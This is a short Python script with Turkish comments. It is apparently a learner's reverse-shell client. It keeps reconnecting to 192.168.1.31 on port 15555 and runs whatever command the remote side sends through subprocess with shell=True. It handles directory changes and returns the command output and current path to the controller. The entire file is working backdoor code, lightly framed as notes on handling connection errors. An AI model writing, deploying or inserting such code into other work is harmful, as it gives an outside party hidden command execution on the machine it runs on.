import socket
import os
import subprocess
import time


#Server açık değilken clientten istek yapılınca ConnectionRefuseError hatası alıyoruz peki bunu nasıl engelleriz

#Bu ConnectionRefuseError için while sonsuz döngüsü açalım

while 1:
    try:      #tekrardan bağlantı yapmaya çalışmalı,serverdan quit aldıktan sonra,bunu çözmek için severden karşı tarafa boş bir veri yolla
        s=socket.socket()
        s.connect(("192.168.1.31",15555))

        while True:
            veri=s.recv(1024)  #serverın quit yazmasıyla bağlantı close edilse bile client veri bekleyecek hep  ##burada takılı kalmamalı,tekrar bağlantı kurmak için yukarıdaki döngüye girmeli##
            if veri[:2].decode("utf-8")=="cd":
                try:
                    os.chdir(veri[3:].decode("utf-8"))
                    s.send(os.getcwd().encode("utf-8"))           
                except FileNotFoundError:
                    s.send("Dosya bulunamadı...".encode("utf-8"))
            else:

                if len(veri)>0: #a harfini server cliente yollayıca bu bloga gireceğiz
                    
                    cmd=subprocess.Popen(veri.decode("utf-8"),shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
                    
                    output=cmd.stdout.read() + cmd.stderr.read() # a bir komut değil bu yüzden stderr bir hata fırlatacak
                    
                    output_str=str(output,encoding="cp857")  
                    
                    konum=os.getcwd() 
                    
                    
                    s.send(str.encode(output_str+"\n"+konum,encoding="utf-8")) #fırlatılacak hata servera yollayanacak,
    except:
        #s.connectte bağlantı hatası aldığımda girilecek blok

        #eğer bağlantı hatası alırsam 1 sn beklesin
        time.sleep(1)
        #1 sn bekledikten sonra döngümün başına gel ve bu işlemler tekrar dene ta kii server açılasıya kadar
        

            
